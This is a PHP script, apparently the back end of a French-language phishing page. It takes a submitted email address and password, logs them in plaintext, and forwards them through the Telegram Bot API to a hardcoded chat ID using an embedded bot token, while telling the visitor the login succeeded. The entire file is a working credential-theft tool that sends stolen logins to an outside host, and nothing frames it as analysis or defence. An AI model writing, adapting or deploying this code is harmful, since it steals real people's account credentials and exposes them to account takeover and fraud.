<?php

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    }
}

$data = [
    'ip' => getUserIP(),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN',
    'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'UNKNOWN',
    'csrf_token' => $_POST['csrf_token'] ?? null,
    'persistent' => isset($_POST['persistent']) ? true : false
];
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['ide']) && isset($data['pwd']) && isset($data['csrf_token'])) {

    $email = $data['ide'];
    $password = $data['pwd'];
    $csrf_token = $data['csrf_token'];
    $persistent = isset($data['persistent']) ? $data['persistent'] : false;

    error_log('Email: ' . $email);
    error_log('Mot de passe: ' . $password);
    error_log('CSRF Token: ' . $csrf_token);
    error_log('Connexion persistante: ' . ($persistent ? 'Oui' : 'Non'));

    $chat_id = '7450973889';
    $telegram_token = '8787845610:AAG3m8r2pgLHykMdcYKWSzDierRsZpa9irg';

    $message = "*Nouvelle connexion réussie  \n";
    $message .= "*Détails de l'utilisateur : \n";
    $message .= "📧 _Email :_ `$email`\n";
    $message .= "🔑 _Mot de passe valide :_`$password` ✅\n";
    $message .= "⚙️ _Connexion persistante :_ " . ($persistent ? 'Oui' : 'Non') . "\n";
    $message .= "*Date :* " . date('Y-m-d H:i:s') . "\n";

    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=" 
           . urlencode($message) . "&parse_mode=Markdown";

    $telegram_response = file_get_contents($url);

    echo json_encode(['success' => true]);

} else {

    echo json_encode([
        'success' => false,
        'message' => 'Données manquantes'
    ]);
}
?>
